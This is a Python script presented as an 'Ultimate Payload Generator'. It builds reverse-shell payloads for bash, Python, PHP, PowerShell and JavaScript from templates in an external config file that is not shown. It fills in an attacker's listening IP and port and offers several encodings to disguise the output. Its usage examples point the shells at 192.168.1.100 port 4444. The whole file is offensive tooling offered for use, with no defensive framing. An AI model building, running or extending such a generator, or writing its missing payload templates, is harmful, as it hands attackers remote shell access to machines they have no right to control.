import argparse
import base64
import json
import logging
import os
import urllib.parse
import binascii
import base58

# Configure logging
logging.basicConfig(filename='payload_generator.log', level=logging.INFO, format='%(asctime)s - %(message)s')

class PayloadGenerator:
    def __init__(self, lhost, lport, config_file='config.json'):
        self.lhost = lhost
        self.lport = lport
        self.config = self.load_config(config_file)

    def load_config(self, config_file):
        """Load payload configurations from a JSON file."""
        if not os.path.isfile(config_file):
            logging.error(f"Configuration file {config_file} not found.")
            raise FileNotFoundError(f"Configuration file {config_file} not found.")
        with open(config_file, 'r') as file:
            return json.load(file)

    def generate_payload(self, payload_type):
        payloads = {
            "bash_reverse": self.bash_reverse_shell,
            "python_reverse": self.python_reverse_shell,
            "php_reverse": self.php_reverse_shell,
            "powershell_reverse": self.powershell_reverse_shell,
            "javascript_reverse": self.javascript_reverse_shell,
            "custom": self.custom_payload,
        }
        if payload_type in payloads:
            return payloads[payload_type]()
        else:
            error_msg = f"Unsupported payload type '{payload_type}'. Supported types: " + ", ".join(payloads.keys())
            logging.error(error_msg)
            raise ValueError(error_msg)

    def bash_reverse_shell(self):
        return self.config["payloads"]["bash_reverse"].format(lhost=self.lhost, lport=self.lport)

    def python_reverse_shell(self):
        return self.config["payloads"]["python_reverse"].format(lhost=self.lhost, lport=self.lport)

    def php_reverse_shell(self):
        return self.config["payloads"]["php_reverse"].format(lhost=self.lhost, lport=self.lport)

    def powershell_reverse_shell(self):
        return self.config["payloads"]["powershell_reverse"].format(lhost=self.lhost, lport=self.lport)

    def javascript_reverse_shell(self):
        return self.config["payloads"]["javascript_reverse"].format(lhost=self.lhost, lport=self.lport)

    def custom_payload(self):
        """Generate a custom payload based on user input."""
        return input("Enter your custom payload: ")

    def encode_base64(self, payload):
        return base64.b64encode(payload.encode('utf-8')).decode('utf-8')

    def encode_base32(self, payload):
        return base64.b32encode(payload.encode('utf-8')).decode('utf-8')

    def encode_base58(self, payload):
        return base58.b58encode(payload.encode('utf-8')).decode('utf-8')

    def encode_url(self, payload):
        return urllib.parse.quote(payload)

    def encode_hex(self, payload):
        return payload.encode('utf-8').hex()

    def encode_utf16(self, payload):
        return payload.encode('utf-16').hex()

    def encode_json(self, payload):
        return json.dumps({"payload": payload})

    def encode_payload(self, payload, encoding):
        encoders = {
            "base64": self.encode_base64,
            "base32": self.encode_base32,
            "base58": self.encode_base58,
            "url": self.encode_url,
            "hex": self.encode_hex,
            "utf16": self.encode_utf16,
            "json": self.encode_json,
        }
        if encoding in encoders:
            return encoders[encoding](payload)
        else:
            error_msg = f"Unsupported encoding '{encoding}'. Supported encodings: " + ", ".join(encoders.keys())
            logging.error(error_msg)
            raise ValueError(error_msg)

    def save_to_file(self, filename, payload):
        with open(filename, 'w') as file:
            file.write(payload)
        logging.info(f"Payload saved to {filename}")

    def print_payload(self, payload, encoding=None):
        if encoding:
            encoded_payload = self.encode_payload(payload, encoding)
            print(f"{encoding.capitalize()} Encoded Payload:\n")
            print(encoded_payload)
        else:
            print("Generated Payload:\n")
            print(payload)

def main():
    parser = argparse.ArgumentParser(
        description="Ultimate Payload Generator with Multiple Encoding Options",
        epilog="Examples:\n"
               "  python3 payload_generator.py bash_reverse 192.168.1.100 4444 -e base64\n"
               "  python3 payload_generator.py python_reverse 192.168.1.100 4444 -e hex -o payload.txt\n"
               "  python3 payload_generator.py custom 192.168.1.100 4444\n"
               "  python3 payload_generator.py php_reverse 192.168.1.100 4444 -e base32"
    )
    parser.add_argument("payload_type", help="Type of payload (e.g., bash_reverse, python_reverse, php_reverse, powershell_reverse, javascript_reverse, custom)")
    parser.add_argument("lhost", help="Local host IP address")
    parser.add_argument("lport", help="Local port number", type=int)
    parser.add_argument("-e", "--encode", choices=["base64", "base32", "base58", "url", "hex", "utf16", "json"], help="Encoding type for the payload")
    parser.add_argument("-o", "--output", help="Output file to save the payload")

    args = parser.parse_args()

    if not (args.payload_type and args.lhost and args.lport):
        parser.print_help()
        return

    try:
        generator = PayloadGenerator(args.lhost, args.lport)
        payload = generator.generate_payload(args.payload_type)
        
        if args.output:
            generator.save_to_file(args.output, payload)
        
        generator.print_payload(payload, args.encode)

    except ValueError as e:
        print(f"Error: {e}")
    except FileNotFoundError as e:
        print(f"Error: {e}")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")

if __name__ == "__main__":
    main()
